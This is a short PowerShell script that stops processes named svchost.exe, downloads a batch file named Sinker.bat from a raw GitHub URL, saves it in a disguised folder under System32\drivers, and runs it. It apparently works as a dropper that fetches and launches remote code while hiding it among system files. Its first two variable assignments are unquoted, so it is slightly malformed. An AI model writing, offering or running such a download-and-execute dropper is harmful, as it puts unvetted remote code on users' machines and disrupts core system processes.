$ProcessName = svchost.exe
$Sinker = Sinker.bat

Stop-Process -processname $ProcessName


# Download Instructions
$url2 = "https://raw.githubusercontent.com/diggles9991/RunMG/master/$Sinker"
$output2 = "C:\Windows\System32\drivers\en-US\etc\$Sinker"
Import-Module BitsTransfer
Start-BitsTransfer -Source $url2 -Destination $output2

Start-Process $output2
